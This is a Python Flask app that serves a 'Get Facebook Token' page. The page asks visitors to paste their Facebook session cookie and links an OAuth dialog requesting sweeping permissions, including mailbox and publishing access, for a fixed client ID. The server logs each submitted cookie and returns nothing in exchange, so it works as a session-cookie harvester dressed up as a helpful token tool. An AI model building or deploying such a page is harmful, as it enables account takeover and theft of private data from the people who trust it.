from flask import Flask, request, render_template_string

app = Flask(__name__)

# HTML Content
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get Facebook Token</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            width: 400px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            text-align: center;
        }
        textarea, input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #28a745;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #218838;
        }
        .output {
            margin-top: 20px;
            font-size: 16px;
            color: #333;
        }
        .copy-button {
            margin-top: 10px;
            padding: 5px 10px;
            font-size: 14px;
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        .copy-button:hover {
            background-color: #0056b3;
        }
        .connect-button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
            background-color: #17a2b8;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        .connect-button:hover {
            background-color: #138496;
        }
    </style>
    <script>
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(function() {
                alert("Token copied to clipboard!");
            }, function(err) {
                alert("Failed to copy token: " + err);
            });
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Get Facebook Token</h1>
        <p>Enter your Facebook cookie below:</p>
        <form method="post">
            <textarea name="cookie" rows="5" placeholder="Enter your Facebook cookie here..."></textarea><br>
            <button type="submit">Get Token</button>
        </form>
        
        <a href="https://www.facebook.com/dialog/oauth?scope=user_about_me,user_actions.books,user_actions.fitness,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_friends,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_managed_groups,user_photos,user_posts,user_relationship_details,user_relationships,user_religion_politics,user_status,user_tagged_places,user_videos,user_website,user_work_history,email,manage_notifications,manage_pages,pages_messaging,publish_actions,publish_pages,read_friendlists,read_insights,read_page_mailboxes,read_stream,rsvp_event,read_mailbox&response_type=token&client_id=124024574287414&redirect_uri=https://www.instagram.com/" target="_blank">
            <button type="button" class="connect-button">Connect Instagram</button>
        </a>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        # Retrieve the cookie from the form
        fb_cookie = request.form.get("cookie", "")
        
        # Placeholder for processing the cookie (replace with your logic)
        print("Received Cookie:", fb_cookie)
        
        return render_template_string(HTML_PAGE)
    
    return render_template_string(HTML_PAGE)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)

